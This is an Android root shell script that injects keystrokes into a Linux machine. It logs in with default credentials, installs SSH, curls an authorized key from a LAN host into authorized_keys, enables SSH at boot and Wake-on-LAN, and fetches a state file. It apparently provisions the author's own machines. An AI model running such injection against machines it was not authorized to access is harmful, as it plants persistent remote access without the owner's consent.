#!/system/bin/sh
# GAIA NEEDLE — Generic Linux injection target
# Login → install SSH → inject SSH key → enable WoL
# 
# Environment variables (set before calling):
#   NEEDLE_USER     - login username (default: gaia)
#   NEEDLE_PASS     - login password (default: gaia)
#   NEEDLE_EASTGATE - eastGate IP for SSH key pull (default: 192.168.4.244)

SU="/debug_ramdisk/su"
TYPE="/data/local/tmp/type.sh"
USER="${NEEDLE_USER:-gaia}"
PASS="${NEEDLE_PASS:-gaia}"
EASTGATE="${NEEDLE_EASTGATE:-192.168.4.244}"

run() { $SU -c "sh $TYPE $*"; }

echo "=== GAIA NEEDLE → Generic Linux ==="
echo "User: $USER | eastGate: $EASTGATE"

# Wait for login screen
sleep 5
run --enter
sleep 1

# Login
echo "Phase 1: Login"
run --line "$USER"
sleep 2
run --line "$PASS"
sleep 5

# Open terminal
echo "Phase 2: Open terminal"
run --ctrl-alt-t
sleep 3

# Install SSH
echo "Phase 3: Install SSH server"
run --line "sudo apt-get update -qq && sudo apt-get install -y openssh-server ethtool curl"
sleep 30  # wait for apt

# Inject SSH key
echo "Phase 4: Inject SSH key"
run --line "mkdir -p ~/.ssh && chmod 700 ~/.ssh"
sleep 1
run --line "curl -s http://${EASTGATE}:8080/data/eastgate-key.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
sleep 3

# Enable SSH on boot
echo "Phase 5: Enable SSH permanently"
run --line "sudo systemctl enable --now ssh"
sleep 2

# Enable Wake-on-LAN
echo "Phase 6: Enable WoL"
run --line "IFACE=\$(ip -o link show | grep 'state UP' | grep -v lo | head -1 | awk -F: '{print \$2}' | tr -d ' ') && sudo ethtool -s \$IFACE wol g 2>/dev/null && echo WoL enabled on \$IFACE"
sleep 2

# Pull heart-pull
echo "Phase 7: Absorb organism state"
run --line "curl -s http://${EASTGATE}:8080/data/heart-pull.json -o ~/heart-pull.json && echo Heart-pull absorbed"

echo "=== INJECTION COMPLETE ==="
echo "Target should now have SSH, WoL, and heart-pull."
echo "Connect from eastGate: ssh $USER@<target-ip>"
